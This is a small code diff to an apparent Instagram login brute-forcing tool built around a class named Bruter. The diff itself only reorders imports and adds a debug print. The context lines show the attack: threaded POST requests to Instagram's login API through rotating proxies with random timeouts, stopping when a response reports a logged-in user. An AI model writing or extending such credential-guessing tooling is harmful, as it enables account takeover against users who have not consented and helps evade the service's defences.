@@ -1,10 +1,10 @@
+from time import time
 from .proxychecker import ProxyChecker
 from .console import (Console,runnerBruteBanner)
-from colorama import (init,Fore)
+from colorama import init,Fore
 from threading import (Thread,Lock)
 from queue import Queue
 from random import (choice,randint)
-from time import time
 import requests
 import json
 import uuid
@@ -70,6 +70,7 @@ class Bruter:
                     s = session.post("https://i.instagram.com/api/v1/accounts/login/",data=__data,headers=__header,proxies=__proxies,timeout=randint(5,50))
 
                     json_load = json.loads(s.text)
+                    print(json_load)
                     for k,v in json_load.items():
                         if k == "logged_in_user":
                             self.__isAlive = False
@@ -136,7 +137,6 @@ class Bruter:
                 
                 for worker in __threads:
                     worker.join()
-                
                 
                 if not self.__isAlive:
                     break
